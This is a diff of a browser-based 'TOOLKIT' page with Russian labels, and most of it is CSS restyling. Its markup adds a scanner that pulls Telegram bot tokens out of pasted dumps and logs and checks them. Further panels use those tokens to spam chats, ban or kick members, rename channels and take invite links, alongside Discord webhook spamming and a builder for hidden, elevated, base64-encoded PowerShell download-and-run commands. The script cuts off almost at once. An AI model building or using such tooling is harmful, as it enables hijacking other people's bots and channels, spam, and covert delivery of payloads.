@@ -7,21 +7,21 @@
 <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
 <style>
 :root {
-  --bg: #f3eef8;
-  --grid: #e4dcf0;
-  --card: #ffffff;
-  --ink: #1a1228;
-  --muted: #6b5f7a;
-  --line: #1a1228;
-  --yellow: #f5e6a8;
-  --purple: #c9a0dc;
-  --pink: #f0b8d0;
-  --green: #a8e0b8;
-  --red: #f0a0a0;
-  --ok: #2d8a4e;
-  --err: #c23030;
-  --info: #6b5f7a;
-  --shadow: 4px 4px 0 #1a1228;
+  --bg: #0e0a14;
+  --grid: #1a1424;
+  --card: #16101f;
+  --ink: #ebe4f5;
+  --muted: #8a7a9e;
+  --line: #c9a0dc;
+  --yellow: #e8d48b;
+  --purple: #a67bc4;
+  --pink: #d48ab0;
+  --green: #6bc48a;
+  --red: #d47070;
+  --ok: #6bc48a;
+  --err: #e08080;
+  --info: #8a7a9e;
+  --shadow: 4px 4px 0 #050308;
   --radius: 4px;
   --font: "IBM Plex Mono", ui-monospace, monospace;
   --pixel: "Press Start 2P", monospace;
@@ -39,14 +39,14 @@ body {
   font-size: 13px;
   line-height: 1.45;
 }
-a { color: #6b3fa0; }
+a { color: var(--purple); }
 .wrap { max-width: 980px; margin: 0 auto; padding: 28px 16px 64px; }
 header { margin-bottom: 20px; }
 header h1 {
   font-family: var(--pixel);
-  font-size: 1.15rem;
-  letter-spacing: 0.02em;
-  text-shadow: 3px 3px 0 var(--purple);
+  font-size: 1.1rem;
+  color: var(--yellow);
+  text-shadow: 3px 3px 0 #3a2050, 0 0 20px rgba(232,212,139,.25);
 }
 header p { color: var(--muted); margin-top: 10px; font-size: 12px; }
 
@@ -60,30 +60,28 @@ header p { color: var(--muted); margin-top: 10px; font-size: 12px; }
 }
 .tab {
   border: 3px solid var(--line);
-  background: var(--card);
+  background: #1c1528;
   color: var(--ink);
-  padding: 10px 12px;
+  padding: 9px 11px;
   border-radius: var(--radius);
   cursor: pointer;
   font-family: var(--font);
   font-weight: 600;
   font-size: 11px;
-  box-shadow: 2px 2px 0 var(--line);
-  transition: transform .08s, box-shadow .08s;
+  box-shadow: 2px 2px 0 #050308;
+  transition: transform .08s, box-shadow .08s, background .1s;
 }
-.tab:hover { transform: translate(-1px, -1px); box-shadow: 3px 3px 0 var(--line); }
-.tab:active { transform: translate(1px, 1px); box-shadow: 1px 1px 0 var(--line); }
+.tab:hover { transform: translate(-1px,-1px); box-shadow: 3px 3px 0 #050308; background: #241c32; }
+.tab:active { transform: translate(1px,1px); box-shadow: 1px 1px 0 #050308; }
 .tab.on {
   background: var(--purple);
-  box-shadow: 2px 2px 0 var(--line);
+  color: #0e0a14;
+  box-shadow: 2px 2px 0 #050308;
 }
 
 .panel { display: none; }
 .panel.on { display: block; animation: pop .15s ease; }
-@keyframes pop {
-  from { opacity: 0; transform: translateY(4px); }
-  to { opacity: 1; transform: none; }
-}
+@keyframes pop { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: none; } }
 
 .card {
   background: var(--card);
@@ -95,10 +93,10 @@ header p { color: var(--muted); margin-top: 10px; font-size: 12px; }
 }
 .card h2 {
   font-family: var(--pixel);
-  font-size: 0.62rem;
+  font-size: 0.58rem;
   letter-spacing: 0.04em;
   margin-bottom: 14px;
-  color: var(--ink);
+  color: var(--yellow);
 }
 
 label {
@@ -112,27 +110,24 @@ label {
 }
 input[type=text], input[type=password], input[type=number], textarea, select {
   width: 100%;
-  background: #faf8fc;
-  border: 3px solid var(--line);
+  background: #0e0a14;
+  border: 3px solid #4a3a60;
   border-radius: var(--radius);
   color: var(--ink);
   padding: 10px 11px;
   font: 13px/1.4 var(--font);
   outline: none;
-  box-shadow: inset 2px 2px 0 rgba(0,0,0,.04);
 }
 input:focus, textarea:focus, select:focus {
-  background: #fff;
-  box-shadow: 0 0 0 3px var(--purple);
+  border-color: var(--purple);
+  box-shadow: 0 0 0 2px rgba(166,123,196,.35);
 }
-textarea { min-height: 120px; resize: vertical; }
+textarea { min-height: 110px; resize: vertical; }
 
 .row { display: grid; gap: 12px; margin-bottom: 12px; }
 .row2 { grid-template-columns: 1fr 1fr; }
 .row3 { grid-template-columns: 1fr 1fr 1fr; }
-@media (max-width: 720px) {
-  .row2, .row3 { grid-template-columns: 1fr; }
-}
+@media (max-width: 720px) { .row2, .row3 { grid-template-columns: 1fr; } }
 
 .hint { font-size: 11px; color: var(--muted); margin-top: 6px; }
 
@@ -144,89 +139,63 @@ textarea { min-height: 120px; resize: vertical; }
   font: 600 11px/1 var(--font);
   letter-spacing: .03em;
   text-transform: uppercase;
-  box-shadow: 3px 3px 0 var(--line);
+  box-shadow: 3px 3px 0 #050308;
   transition: transform .08s, box-shadow .08s;
+  color: #0e0a14;
 }
-.btn:hover { transform: translate(-1px, -1px); box-shadow: 4px 4px 0 var(--line); }
-.btn:active { transform: translate(2px, 2px); box-shadow: 1px 1px 0 var(--line); }
-.btn:disabled { opacity: .45; cursor: not-allowed; transform: none; box-shadow: 2px 2px 0 var(--line); }
-.btn-primary { background: var(--yellow); color: var(--ink); width: 100%; }
-.btn-accent { background: var(--purple); color: var(--ink); width: 100%; }
+.btn:hover { transform: translate(-1px,-1px); box-shadow: 4px 4px 0 #050308; }
+.btn:active { transform: translate(2px,2px); box-shadow: 1px 1px 0 #050308; }
+.btn:disabled { opacity: .4; cursor: not-allowed; transform: none; }
+.btn-primary { background: var(--yellow); width: 100%; }
+.btn-accent { background: var(--purple); width: 100%; color: #0e0a14; }
+.btn-danger { background: var(--red); width: 100%; }
 .btn-ghost {
-  background: var(--card);
-  color: var(--ink);
-  width: 100%;
-  margin-top: 8px;
+  background: #1c1528; color: var(--ink);
+  width: 100%; margin-top: 8px;
 }
 .btn-sm {
-  background: var(--yellow);
-  color: var(--ink);
+  background: var(--yellow); color: #0e0a14;
   border: 3px solid var(--line);
-  padding: 7px 11px;
-  border-radius: var(--radius);
-  font-size: 11px;
-  font-weight: 600;
-  cursor: pointer;
-  box-shadow: 2px 2px 0 var(--line);
+  padding: 7px 11px; border-radius: var(--radius);
+  font-size: 11px; font-weight: 600; cursor: pointer;
+  box-shadow: 2px 2px 0 #050308;
 }
-.btn-sm:hover { transform: translate(-1px, -1px); }
 .actions { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
 
-.stats {
-  display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin: 14px 0;
-}
+.stats { display: grid; grid-template-columns: repeat(4,1fr); gap: 8px; margin: 14px 0; }
 @media (max-width: 640px) { .stats { grid-template-columns: 1fr 1fr; } }
 .stat {
-  background: var(--yellow);
+  background: #1c1528;
   border: 3px solid var(--line);
   border-radius: var(--radius);
-  padding: 12px;
-  text-align: center;
-  box-shadow: 2px 2px 0 var(--line);
+  padding: 12px; text-align: center;
+  box-shadow: 2px 2px 0 #050308;
 }
-.stat b { display: block; font-family: var(--pixel); font-size: 0.85rem; }
-.stat span { font-size: 9px; color: var(--muted); text-transform: uppercase; letter-spacing: .05em; }
+.stat b { display: block; font-family: var(--pixel); font-size: 0.8rem; color: var(--yellow); }
+.stat span { font-size: 9px; color: var(--muted); text-transform: uppercase; }
 
 .progress {
-  height: 14px;
-  background: #eee8f5;
-  border: 3px solid var(--line);
-  border-radius: var(--radius);
-  overflow: hidden;
-  margin: 10px 0 16px;
-  box-shadow: inset 2px 2px 0 rgba(0,0,0,.06);
+  height: 14px; background: #0e0a14;
+  border: 3px solid var(--line); border-radius: var(--radius);
+  overflow: hidden; margin: 10px 0 16px;
 }
-.progress > i {
-  display: block; height: 100%; width: 0;
-  background: var(--purple);
-  transition: width .25s;
-}
+.progress > i { display: block; height: 100%; width: 0; background: var(--purple); transition: width .25s; }
 
 .log {
-  background: #1a1228;
-  color: #e8e0f0;
-  border: 3px solid var(--line);
-  border-radius: var(--radius);
-  height: 180px;
-  overflow: auto;
-  padding: 10px 12px;
+  background: #0a0610; color: #d4c8e8;
+  border: 3px solid #4a3a60; border-radius: var(--radius);
+  height: 180px; overflow: auto; padding: 10px 12px;
   font: 12px/1.6 var(--font);
-  box-shadow: inset 2px 2px 0 rgba(0,0,0,.3);
 }
-.log .ok { color: #7ddea0; }
-.log .err { color: #ff8a8a; }
-.log .info { color: #a89bb8; }
+.log .ok { color: var(--ok); } .log .err { color: var(--err); } .log .info { color: var(--info); }
 
 .msg-list { display: flex; flex-direction: column; gap: 8px; max-height: 420px; overflow: auto; }
 .msg-item {
-  display: grid; grid-template-columns: 120px 1fr auto; gap: 10px;
-  background: #faf8fc;
-  border: 3px solid var(--line);
-  border-radius: var(--radius);
-  padding: 10px 12px;
-  box-shadow: 2px 2px 0 var(--line);
+  display: grid; grid-template-columns: 1fr auto; gap: 10px;
+  background: #1c1528; border: 3px solid #4a3a60;
+  border-radius: var(--radius); padding: 10px 12px;
+  box-shadow: 2px 2px 0 #050308;
 }
-@media (max-width: 640px) { .msg-item { grid-template-columns: 1fr; } }
 .msg-from { font-size: 11px; color: var(--muted); }
 .msg-body { font-size: 13px; word-break: break-word; }
 .msg-time { font-size: 11px; color: var(--muted); }
@@ -235,77 +204,68 @@ textarea { min-height: 120px; resize: vertical; }
 @media (max-width: 640px) { .cbs { grid-template-columns: 1fr; } }
 .cb {
   display: flex; gap: 8px; align-items: flex-start; padding: 10px;
-  background: #faf8fc;
-  border: 3px solid var(--line);
-  border-radius: var(--radius);
-  font-size: 12px;
-  cursor: pointer;
-  box-shadow: 2px 2px 0 var(--line);
+  background: #1c1528; border: 3px solid #4a3a60;
+  border-radius: var(--radius); font-size: 12px; cursor: pointer;
+  box-shadow: 2px 2px 0 #050308;
 }
-.cb input { margin-top: 2px; accent-color: #6b3fa0; }
+.cb input { margin-top: 2px; accent-color: var(--purple); }
 
 .pathbox {
-  margin-top: 10px; padding: 10px 12px;
-  border-radius: var(--radius);
-  background: var(--yellow);
-  border: 3px solid var(--line);
-  font: 12px/1.5 var(--font);
-  word-break: break-all;
-  box-shadow: 2px 2px 0 var(--line);
+  margin-top: 10px; padding: 10px 12px; border-radius: var(--radius);
+  background: #1c1528; border: 3px solid var(--line);
+  font: 12px/1.5 var(--font); word-break: break-all;
+  box-shadow: 2px 2px 0 #050308; color: var(--yellow);
 }
 pre.out {
   margin-top: 10px; padding: 12px;
-  background: #1a1228; color: #e8e0f0;
-  border: 3px solid var(--line);
-  border-radius: var(--radius);
-  font: 12px/1.55 var(--font);
-  white-space: pre-wrap; word-break: break-all;
+  background: #0a0610; color: #d4c8e8;
+  border: 3px solid #4a3a60; border-radius: var(--radius);
+  font: 12px/1.55 var(--font); white-space: pre-wrap; word-break: break-all;
   max-height: 360px; overflow: auto;
-  box-shadow: inset 2px 2px 0 rgba(0,0,0,.3);
 }
 
 .toast {
   position: fixed; left: 50%; bottom: 22px;
   transform: translateX(-50%) translateY(120%);
-  background: var(--green);
-  color: var(--ink);
-  border: 3px solid var(--line);
-  padding: 10px 16px;
-  border-radius: 999px;
-  font: 600 12px/1 var(--font);
-  box-shadow: 3px 3px 0 var(--line);
-  transition: transform .2s;
-  z-index: 50;
+  background: var(--green); color: #0e0a14;
+  border: 3px solid var(--line); padding: 10px 16px;
+  border-radius: 999px; font: 600 12px/1 var(--font);
+  box-shadow: 3px 3px 0 #050308; transition: transform .2s; z-index: 50;
 }
 .toast.on { transform: translateX(-50%) translateY(0); }
-
 footer { margin-top: 24px; color: var(--muted); font-size: 11px; }
 .badge {
-  display: inline-block;
-  border: 2px solid var(--line);
-  background: var(--pink);
-  padding: 2px 8px;
-  font-size: 10px;
-  font-weight: 600;
-  border-radius: 3px;
-  box-shadow: 1px 1px 0 var(--line);
+  display: inline-block; border: 2px solid var(--line);
+  padding: 2px 8px; font-size: 10px; font-weight: 600;
+  border-radius: 3px; box-shadow: 1px 1px 0 #050308;
 }
-.status-ok { background: var(--green); }
-.status-bad { background: var(--red); }
+.status-ok { background: var(--green); color: #0e0a14; }
+.status-bad { background: var(--red); color: #0e0a14; }
+.chan-card {
+  background: #1c1528; border: 3px solid #4a3a60;
+  border-radius: var(--radius); padding: 12px; margin-bottom: 10px;
+  box-shadow: 2px 2px 0 #050308;
+}
+.chan-card h3 { font-size: 13px; color: var(--yellow); margin-bottom: 6px; }
+.chan-meta { font-size: 11px; color: var(--muted); margin-bottom: 8px; }
+.chan-actions { display: flex; flex-wrap: wrap; gap: 6px; }
 </style>
 </head>
 <body>
 <div class="wrap">
   <header>
     <h1>TOOLKIT</h1>
-    <p>TG · PowerShell · codec · keys · spam · checkers</p>
+    <p>TG · Discord · PS · codec · parse</p>
   </header>
 
-  <nav class="tabs" id="tabs">
+  <nav class="tabs">
     <button class="tab on" data-tab="tg" type="button">TG Forward</button>
     <button class="tab" data-tab="msgs" type="button">Сообщения</button>
     <button class="tab" data-tab="spam" type="button">TG Спам</button>
-    <button class="tab" data-tab="hook" type="button">Webhook</button>
+    <button class="tab" data-tab="parse" type="button">Парсер токенов</button>
+    <button class="tab" data-tab="profile" type="button">Профиль бота</button>
+    <button class="tab" data-tab="chans" type="button">Каналы</button>
+    <button class="tab" data-tab="hook" type="button">Discord WH</button>
     <button class="tab" data-tab="check" type="button">Чекеры</button>
     <button class="tab" data-tab="ps" type="button">PowerShell</button>
     <button class="tab" data-tab="codec" type="button">Encode</button>
@@ -313,7 +273,6 @@ footer { margin-top: 24px; color: var(--muted); font-size: 11px; }
     <button class="tab" data-tab="psdec" type="button">PS Decode</button>
   </nav>
 
-  <!-- TG Forward -->
   <section class="panel on" id="tab-tg">
     <div class="card">
       <h2>Бот</h2>
@@ -326,12 +285,12 @@ footer { margin-top: 24px; color: var(--muted); font-size: 11px; }
       </div>
       <div class="row row2">
         <div>
-          <label>From chat id</label>
-          <input type="text" id="fromChat" placeholder="-100... или @channel">
+          <label>From chat id (пусто = все из getUpdates)</label>
+          <input type="text" id="fromChat" placeholder="пусто = auto">
         </div>
         <div>
-          <label>To chat id</label>
-          <input type="text" id="toChat" placeholder="-100... или user id">
+          <label>To chat id (пусто = те же чаты)</label>
+          <input type="text" id="toChat" placeholder="пусто = reply same">
         </div>
       </div>
       <div class="row row3">
@@ -348,14 +307,15 @@ footer { margin-top: 24px; color: var(--muted); font-size: 11px; }
           <input type="number" id="delay" value="350">
         </div>
       </div>
-      <button class="btn btn-primary" id="startBtn" type="button">Старт forward</button>
+      <label class="cb" style="margin-bottom:12px"><input type="checkbox" id="fwdAll"> Режим: все новые updates → to (или mirror)</label>
+      <button class="btn btn-primary" id="startBtn" type="button">Старт</button>
       <button class="btn btn-ghost" id="stopBtn" type="button" style="display:none">Стоп</button>
     </div>
     <div class="card" id="progressCard" style="display:none">
       <h2 id="progressTitle">Работает</h2>
       <div class="progress"><i id="progressFill"></i></div>
       <div class="stats">
-        <div class="stat"><b id="sCurrent">0</b><span>current</span></div>
+        <div class="stat"><b id="sCurrent">0</b><span>cur</span></div>
         <div class="stat"><b id="sForwarded">0</b><span>ok</span></div>
         <div class="stat"><b id="sSkipped">0</b><span>skip</span></div>
         <div class="stat"><b id="sErrors">0</b><span>err</span></div>
@@ -364,54 +324,36 @@ footer { margin-top: 24px; color: var(--muted); font-size: 11px; }
     </div>
   </section>
 
-  <!-- Messages -->
   <section class="panel" id="tab-msgs">
     <div class="card">
-      <h2>Последние updates</h2>
+      <h2>Updates</h2>
       <div class="actions">
-        <button class="btn-sm" type="button" id="loadMsgs">Обновить getUpdates</button>
+        <button class="btn-sm" type="button" id="loadMsgs">getUpdates</button>
         <span class="hint" id="msgsStatus"></span>
       </div>
-      <div class="msg-list" id="msgList" style="margin-top:12px">
-        <div class="hint">Токен с вкладки TG Forward → Обновить</div>
-      </div>
+      <div class="msg-list" id="msgList" style="margin-top:12px"><div class="hint">токен → обновить</div></div>
     </div>
   </section>
 
-  <!-- TG Spam -->
   <section class="panel" id="tab-spam">
     <div class="card">
-      <h2>Рассылка по токену</h2>
-      <div class="row">
-        <div>
-          <label>Токен бота</label>
-          <input type="password" id="spamToken" placeholder="123456:AA..." autocomplete="off">
-        </div>
-      </div>
-      <div class="row">
-        <div>
-          <label>Chat IDs (по одному в строке)</label>
-          <textarea id="spamChats" placeholder="-100123&#10;123456789"></textarea>
-        </div>
-      </div>
-      <div class="row">
-        <div>
-          <label>Текст</label>
-          <textarea id="spamText" placeholder="сообщение"></textarea>
-        </div>
-      </div>
+      <h2>TG рассылка</h2>
+      <div class="row"><div>
+        <label>Токен (или с Forward)</label>
+        <input type="password" id="spamToken" autocomplete="off">
+      </div></div>
+      <div class="row"><div>
+        <label>Chat IDs</label>
+        <textarea id="spamChats" placeholder="-100...&#10;123456"></textarea>
+      </div></div>
+      <div class="row"><div>
+        <label>Текст</label>
+        <textarea id="spamText"></textarea>
+      </div></div>
       <div class="row row2">
-        <div>
-          <label>Delay мс</label>
-          <input type="number" id="spamDelay" value="500">
-        </div>
-        <div>
-          <label>Parse mode</label>
-          <select id="spamParse">
-            <option value="">plain</option>
-            <option value="HTML">HTML</option>
-            <option value="Markdown">Markdown</option>
-          </select>
+        <div><label>Delay мс</label><input type="number" id="spamDelay" value="500"></div>
+        <div><label>Parse</label>
+          <select id="spamParse"><option value="">plain</option><option value="HTML">HTML</option><option value="Markdown">Markdown</option></select>
         </div>
       </div>
       <button class="btn btn-primary" id="spamStart" type="button">Отправить</button>
@@ -420,126 +362,182 @@ footer { margin-top: 24px; color: var(--muted); font-size: 11px; }
     </div>
   </section>
 
-  <!-- Webhook spam -->
-  <section class="panel" id="tab-hook">
+  <section class="panel" id="tab-parse">
     <div class="card">
-      <h2>Webhook spam</h2>
-      <div class="row">
-        <div>
-          <label>Webhook URL (по одному в строке)</label>
-          <textarea id="hookUrls" placeholder="https://discord.com/api/webhooks/...&#10;https://..."></textarea>
-        </div>
-      </div>
-      <div class="row">
-        <div>
-          <label>JSON body / текст</label>
-          <textarea id="hookBody" placeholder='{"content":"hello"}'></textarea>
-        </div>
-      </div>
-      <div class="row row2">
-        <div>
-          <label>Delay мс</label>
-          <input type="number" id="hookDelay" value="800">
-        </div>
-        <div>
-          <label>Повторов на URL</label>
-          <input type="number" id="hookRepeat" value="1" min="1" max="50">
-        </div>
-      </div>
-      <button class="btn btn-primary" id="hookStart" type="button">Отправить</button>
-      <button class="btn btn-ghost" id="hookStop" type="button" style="display:none">Стоп</button>
-      <div class="log" id="hookLog" style="margin-top:12px;display:none"></div>
+      <h2>Парсер токенов</h2>
+      <p class="hint" style="margin-bottom:10px">Вставь дамп / логи / текст — найдёт \d+:[A-Za-z0-9_-]{30,} и проверит getMe</p>
+      <div class="row"><div>
+        <label>Текст</label>
+        <textarea id="parseIn" placeholder="вставь текст с токенами"></textarea>
+      </div></div>
+      <button class="btn btn-primary" id="parseRun" type="button">Сканировать</button>
+      <div id="parseOut" style="margin-top:12px"></div>
     </div>
   </section>
 
-  <!-- Checkers -->
-  <section class="panel" id="tab-check">
+  <section class="panel" id="tab-profile">
     <div class="card">
-      <h2>Чекер токена TG</h2>
-      <div class="row">
-        <div>
-          <label>Токены (по одному в строке)</label>
-          <textarea id="chkTokens" placeholder="123456:AA..."></textarea>
+      <h2>Профиль бота</h2>
+      <div class="row"><div>
+        <label>Токен</label>
+        <input type="password" id="profToken" autocomplete="off">
+      </div></div>
+      <div class="row"><div>
+        <label>Имя (name)</label>
+        <input type="text" id="profName" placeholder="My Bot">
+      </div></div>
+      <div class="row"><div>
+        <label>Описание</label>
+        <textarea id="profDesc" placeholder="about"></textarea>
+      </div></div>
+      <div class="row"><div>
+        <label>Short description</label>
+        <input type="text" id="profShort" placeholder="short">
+      </div></div>
+      <div class="row"><div>
+        <label>URL иконки (jpg/png публичный)</label>
+        <input type="text" id="profPhoto" placeholder="https://.../icon.jpg">
+      </div></div>
+      <div class="row row2">
+        <div><label>Интервал сек</label><input type="number" id="profInterval" value="30" min="5"></div>
+        <div style="display:flex;align-items:flex-end">
+          <label class="cb" style="width:100%"><input type="checkbox" id="profLoop"> Крутить пока вкладка открыта</label>
         </div>
       </div>
-      <button class="btn btn-primary" id="chkTokenBtn" type="button">Проверить</button>
+      <button class="btn btn-primary" id="profOnce" type="button">Применить сейчас</button>
+      <button class="btn btn-accent" id="profStart" type="button" style="margin-top:8px">Старт цикла</button>
+      <button class="btn btn-ghost" id="profStop" type="button" style="display:none">Стоп цикла</button>
+      <div class="log" id="profLog" style="margin-top:12px;height:120px"></div>
+    </div>
+  </section>
+
+  <section class="panel" id="tab-chans">
+    <div class="card">
+      <h2>Каналы / группы</h2>
+      <div class="row"><div>
+        <label>Токен</label>
+        <input type="password" id="chanToken" autocomplete="off">
+      </div></div>
+      <div class="row"><div>
+        <label>Chat IDs (по одному) — бот должен быть admin</label>
+        <textarea id="chanIds" placeholder="-100..."></textarea>
+      </div></div>
+      <button class="btn btn-primary" id="chanScan" type="button">Сканировать</button>
+      <button class="btn-sm" type="button" id="chanFromUpdates" style="margin-top:8px">Подтянуть id из getUpdates</button>
+      <div id="chanOut" style="margin-top:14px"></div>
+    </div>
+    <div class="card">
+      <h2>Действие</h2>
+      <div class="row row2">
+        <div><label>Chat id</label><input type="text" id="actChat"></div>
+        <div><label>User id (ban/kick/add)</label><input type="text" id="actUser"></div>
+      </div>
+      <div class="row"><div>
+        <label>Текст / новое название</label>
+        <input type="text" id="actText">
+      </div></div>
+      <div class="chan-actions">
+        <button class="btn-sm" type="button" data-act="spam">Спам текст</button>
+        <button class="btn-sm" type="button" data-act="ban">Бан</button>
+        <button class="btn-sm" type="button" data-act="kick">Кик</button>
+        <button class="btn-sm" type="button" data-act="unban">Разбан</button>
+        <button class="btn-sm" type="button" data-act="title">Сменить название</button>
+        <button class="btn-sm" type="button" data-act="invite">Инвайт-ссылка</button>
+      </div>
+      <div class="log" id="actLog" style="margin-top:12px;height:100px"></div>
+    </div>
+  </section>
+
+  <section class="panel" id="tab-hook">
+    <div class="card">
+      <h2>Discord webhook</h2>
+      <div class="row"><div>
+        <label>Webhook URLs</label>
+        <textarea id="hookUrls" placeholder="https://discord.com/api/webhooks/..."></textarea>
+      </div></div>
+      <div class="row"><div>
+        <label>Контент / JSON</label>
+        <textarea id="hookBody" placeholder='{"content":"hi"} или просто текст'></textarea>
+      </div></div>
+      <div class="row row2">
+        <div><label>Delay мс</label><input type="number" id="hookDelay" value="800"></div>
+        <div><label>Повторов</label><input type="number" id="hookRepeat" value="1" min="1" max="50"></div>
+      </div>
+      <button class="btn btn-primary" id="hookStart" type="button">Спам</button>
+      <button class="btn btn-ghost" id="hookStop" type="button" style="display:none">Стоп</button>
+      <div class="log" id="hookLog" style="margin-top:12px;display:none"></div>
+    </div>
+    <div class="card">
+      <h2>Пересылка в webhook</h2>
+      <p class="hint" style="margin-bottom:8px">Берёт последние TG updates и шлёт текст в Discord WH</p>
+      <div class="row"><div>
+        <label>TG токен</label>
+        <input type="password" id="hookTgToken" autocomplete="off">
+      </div></div>
+      <div class="row"><div>
+        <label>Discord WH URL</label>
+        <input type="text" id="hookFwdUrl">
+      </div></div>
+      <button class="btn btn-accent" id="hookFwd" type="button">Переслать updates → WH</button>
+      <div class="log" id="hookFwdLog" style="margin-top:12px;height:120px"></div>
+    </div>
+  </section>
+
+  <section class="panel" id="tab-check">
+    <div class="card">
+      <h2>Чекер токенов TG</h2>
+      <div class="row"><div><label>Токены</label><textarea id="chkTokens"></textarea></div></div>
+      <button class="btn btn-primary" id="chkTokenBtn" type="button">Check</button>
       <div id="chkTokenOut" style="margin-top:12px"></div>
     </div>
     <div class="card">
       <h2>Чекер webhook</h2>
-      <div class="row">
-        <div>
-          <label>Webhook URLs</label>
-          <textarea id="chkHooks" placeholder="https://discord.com/api/webhooks/..."></textarea>
-        </div>
-      </div>
-      <button class="btn btn-primary" id="chkHookBtn" type="button">Проверить</button>
+      <div class="row"><div><label>URLs</label><textarea id="chkHooks"></textarea></div></div>
+      <button class="btn btn-primary" id="chkHookBtn" type="button">Check</button>
       <div id="chkHookOut" style="margin-top:12px"></div>
     </div>
   </section>
 
-  <!-- PowerShell -->
   <section class="panel" id="tab-ps">
     <div class="card">
       <h2>Download + run</h2>
-      <div class="row">
-        <div>
-          <label>File URL</label>
-          <input type="text" id="psUrl" placeholder="https://example.com/file.exe">
-        </div>
-      </div>
+      <div class="row"><div><label>File URL</label><input type="text" id="psUrl"></div></div>
       <div class="row row2">
-        <div>
-          <label>Имя файла</label>
-          <input type="text" id="psName" placeholder="из URL">
-        </div>
-        <div>
-          <label>Куда</label>
+        <div><label>Имя</label><input type="text" id="psName"></div>
+        <div><label>Куда</label>
           <select id="psDir">
             <option value="TEMP">%TEMP%</option>
             <option value="LOCALAPPDATA">%LOCALAPPDATA%</option>
             <option value="APPDATA">%APPDATA%</option>
             <option value="DOWNLOADS">Downloads</option>
-            <option value="CUSTOM">Свой путь</option>
+            <option value="CUSTOM">Custom</option>
           </select>
         </div>
       </div>
       <div class="row" id="psCustomWrap" style="display:none">
-        <div>
-          <label>Свой путь</label>
-          <input type="text" id="psCustom" placeholder="C:\Users\Public\App">
-        </div>
+        <div><label>Path</label><input type="text" id="psCustom"></div>
       </div>
       <div class="cbs" style="margin:12px 0">
-        <label class="cb"><input type="checkbox" id="psHidden"> Hidden attribute</label>
+        <label class="cb"><input type="checkbox" id="psHidden"> Hidden</label>
         <label class="cb"><input type="checkbox" id="psSilent" checked> Hidden window</label>
-        <label class="cb"><input type="checkbox" id="psWait"> Wait process</label>
+        <label class="cb"><input type="checkbox" id="psWait"> Wait</label>
         <label class="cb"><input type="checkbox" id="psAdmin"> Elevated</label>
-        <label class="cb"><input type="checkbox" id="psMkdir" checked> Create folder</label>
-        <label class="cb"><input type="checkbox" id="psB64"> Base64 -enc</label>
+        <label class="cb"><input type="checkbox" id="psMkdir" checked> Mkdir</label>
+        <label class="cb"><input type="checkbox" id="psB64"> -enc</label>
       </div>
       <div class="pathbox" id="psPath">path: —</div>
       <button class="btn btn-primary" id="psBuild" type="button" style="margin-top:12px">Собрать</button>
       <pre class="out" id="psOut">—</pre>
-      <div class="actions">
-        <button class="btn-sm" type="button" id="psCopy">Копировать</button>
-      </div>
+      <div class="actions"><button class="btn-sm" type="button" id="psCopy">Copy</button></div>
     </div>
   </section>
 
-  <!-- Codec -->
   <section class="panel" id="tab-codec">
     <div class="card">
       <h2>Encode / Decode</h2>
-      <div class="row">
-        <div>
-          <label>Ввод</label>
-          <textarea id="codecIn" placeholder="текст"></textarea>
-        </div>
-      </div>
+      <div class="row"><div><label>In</label><textarea id="codecIn"></textarea></div></div>
       <div class="row row2">
-        <div>
-          <label>Режим</label>
+        <div><label>Mode</label>
           <select id="codecMode">
             <option value="b64e">Base64 encode</option>
             <option value="b64d">Base64 decode</option>
@@ -547,53 +545,34 @@ footer { margin-top: 24px; color: var(--muted); font-size: 11px; }
             <option value="urldec">URL decode</option>
             <option value="hexe">Hex encode</option>
             <option value="hexd">Hex decode</option>
-            <option value="ue">Unicode escape</option>
-            <option value="ud">Unicode unescape</option>
           </select>
         </div>
         <div style="display:flex;align-items:flex-end;gap:8px">
-          <button class="btn btn-primary" type="button" id="codecRun" style="width:auto;padding:12px 20px">Run</button>
+          <button class="btn btn-primary" type="button" id="codecRun" style="width:auto">Run</button>
           <button class="btn-sm" type="button" id="codecCopy">Copy</button>
-          <button class="btn-sm" type="button" id="codecSwap">Swap</button>
         </div>
       </div>
-      <div class="row">
-        <div>
-          <label>Вывод</label>
-          <textarea id="codecOut" readonly></textarea>
-        </div>
-      </div>
+      <div class="row"><div><label>Out</label><textarea id="codecOut" readonly></textarea></div></div>
     </div>
   </section>
 
-  <!-- Keys -->
   <section class="panel" id="tab-keys">
     <div class="card">
-      <h2>Генератор</h2>
+      <h2>Ключи</h2>
       <div class="row row3">
-        <div>
-          <label>Длина</label>
-          <input type="number" id="keyLen" value="32" min="8" max="256">
-        </div>
-        <div>
-          <label>Алфавит</label>
+        <div><label>Len</label><input type="number" id="keyLen" value="32" min="8" max="256"></div>
+        <div><label>Alpha</label>
           <select id="keyAlpha">
             <option value="hex">Hex</option>
-            <option value="alnum">Alphanumeric</option>
-            <option value="base64">Base64-ish</option>
-            <option value="uuid">UUID v4</option>
+            <option value="alnum">Alnum</option>
+            <option value="uuid">UUID</option>
           </select>
         </div>
         <div style="display:flex;align-items:flex-end">
-          <button class="btn btn-primary" type="button" id="keyGen">Generate</button>
+          <button class="btn btn-primary" type="button" id="keyGen">Gen</button>
         </div>
       </div>
-      <div class="row">
-        <div>
-          <label>Результат</label>
-          <input type="text" id="keyOut" readonly>
-        </div>
-      </div>
+      <div class="row"><div><label>Out</label><input type="text" id="keyOut" readonly></div></div>
       <div class="actions">
         <button class="btn-sm" type="button" id="keyCopy">Copy</button>
         <button class="btn-sm" type="button" id="keyGen5">×5</button>
@@ -602,414 +581,542 @@ footer { margin-top: 24px; color: var(--muted); font-size: 11px; }
     </div>
   </section>
 
-  <!-- PS Decode -->
   <section class="panel" id="tab-psdec">
     <div class="card">
       <h2>PS Decode</h2>
-      <p class="hint" style="margin-bottom:12px">-EncodedCommand / -enc, FromBase64String</p>
-      <div class="row">
-        <div>
-          <label>Команда</label>
-          <textarea id="psDecIn" placeholder="powershell -enc JAB..."></textarea>
-        </div>
-      </div>
+      <div class="row"><div><label>Cmd</label><textarea id="psDecIn" placeholder="powershell -enc ..."></textarea></div></div>
       <button class="btn btn-primary" type="button" id="psDecRun">Decode</button>
       <pre class="out" id="psDecOut">—</pre>
     </div>
   </section>
 
-  <footer>static · vercel · api из браузера</footer>
+  <footer>static · browser api</footer>
 </div>
 <div class="toast" id="toast">ok</div>
 
 <script>
 const $ = id => document.getElementById(id);
-const toast = (m) => {
